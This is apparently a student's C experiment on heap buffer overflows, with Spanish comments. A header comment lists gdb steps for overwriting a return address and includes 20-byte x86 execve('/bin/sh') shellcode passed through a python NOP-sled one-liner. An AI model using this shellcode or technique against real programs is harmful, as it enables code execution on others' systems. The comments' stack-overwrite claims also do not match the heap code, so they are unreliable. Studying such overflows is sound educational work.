#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
*
* Dynamic Memory experiments
* 
*
* References:
* https://www.geeksforgeeks.org/c/memory-layout-of-c-program/
* https://users.cs.jmu.edu/bernstdh/web/common/lectures/summary_vulnerabilities_c_buffer-overflows.php
*
*
* Usage: make memory_checks && ./memory_checks 1234567
*
* make debug
* list show program code
* disas main show main function assembly code
* run 123456781234567812345678 - segfaults
* run 123456781234567811111111 - segfaults
* run 1234567812345678111111111 - overwrites return address
* run 1234567812345678111111118 - overwrites return address to 0x...38
* (0x38 is ASCII for character '8') Return address (rip) is being rewritten
* Check with info registers
* shellcode: 20 bytes
* unsigned char buf[] = 
"\x31\xc9\xf7\xe1\xb0\x0b\x68\x2f\x73\x68\x00\x68\x2f\x62"
"\x69\x6e\x89\xe3\xcd\x80"
*
* run $(python -c 'print ("\x90" * 9 + "\x31\xc9\xf7\xe1\xb0\x0b\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "\x51")')
* x /200 $rsp - 75
*
* x /200xw $rsp - 50
*
*/

#include <malloc.h>

int main(int argc, char *argv[]) {
    //char t[] = "1936";  // -> Temporal, solo para tener el texto;
    //char *txt = NULL;   // -> Puntero donde va ir el texto temporal, buscamos que sea afectado por el desbordamiento.
    float *txt = NULL; 
    char *buf = NULL;   // -> Puntero que intentaremos desbordar.
    
    if (argc <= 1) {
        printf("Usage: %s <attack string>\n", argv[0]);
        exit(1);
    }

    //txt = (char *) malloc(sizeof(char) * sizeof(t));
    buf = (char *) malloc(sizeof(char) * (strlen(argv[1])+1));
    txt = (float *) malloc(sizeof(float));

    //memcpy(txt, t, sizeof(t));
    *txt = 3.141592;

    printf("Direccion en memoria del buffer: %p\n", buf);
    printf("Bytes en memoria del buffer: %zu\n\n", malloc_usable_size(buf));

    printf("Direccion en memoria del texto: %p\n", txt);
    printf("Bytes en memoria del texto: %zu\n\n", malloc_usable_size(txt));    

    printf("Direccion del buffer: %lu\n", (unsigned long)buf);
    printf("Direccion del texto: %lu\n\n", (unsigned long)txt);

    printf("Bytes a almacenar en el buffer: %d\n", strlen(argv[1])+1);
    printf("Longitud del buffer: %d\n", sizeof(char) * (strlen(argv[1])+1));
    printf("Bytes en memoria del buffer: %zu\n", malloc_usable_size(buf));
    printf("Bytes de distancia en memoria: %lu\n\n", (unsigned long)txt-(unsigned long)buf);


    printf("Valor antes de almacenar en el buffer: %f\n\n", *txt);

    printf("Contenido a almacenar en el buffer: %s\n", argv[1]);
    printf("Intentando desbordar el buffer...\n");
    strcpy(buf, argv[1]);
    printf("Contenido del buffer: %s\n\n", buf);
    
    printf("Valor despues de almacenar en el buffer: %f\n", *txt);

    free(buf);
    free(txt);

    return 0;
}